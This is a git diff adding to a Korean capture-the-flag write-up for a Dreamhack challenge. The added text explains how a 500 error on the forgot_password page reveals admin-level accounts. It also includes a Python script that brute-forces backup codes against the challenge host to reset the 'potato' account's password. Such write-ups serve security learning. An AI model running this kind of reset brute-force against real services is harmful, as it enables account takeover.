@@ -156,3 +156,34 @@ app.run(host='0.0.0.0', port=8000)
 
 admin 페이지에 접속을 해야 플래그를 얻을 수 있다.
 
+**admin 페이지에 접속하는 방법은 level이 1인 유저로 로그인해야 한다.**
+
+<br>
+
+개인 테스트 계정을 생성 후 forgot_password 페이지에서 요청을 보내면 500 error가 발생하는 걸 알 수 있다. 
+
+이 부분이 취약점이다. (왜 일어나는지는 알아봐야 한다)
+
+<br>
+
+admin 권한을 갖는 계정들을 user 페이지에서 찾아낸 뒤 하나씩 확인해보면 되는데 나는 potato 계정에서 500 에러가 발생해서 potato 계정의 비밀번호를 알아내었다.
+
+코드는 아래와 같다.
+
+<br>
+
+```python
+import requests
+
+url='http://host2.dreamhack.games:13332/forgot_password'
+headers={'Content-Type':'application/x-www-form-urlencoded'}
+
+for i in range(1,100):
+	payload={'userid':'potato', 'newpassword':'1','backupCode':str(i)}
+	res=requests.post(url,headers=headers,data=payload)
+	print(f"backupCode : {str(i)}")
+	if(res.status_code != 500) :
+		print(res.text)
+		break
+```
+
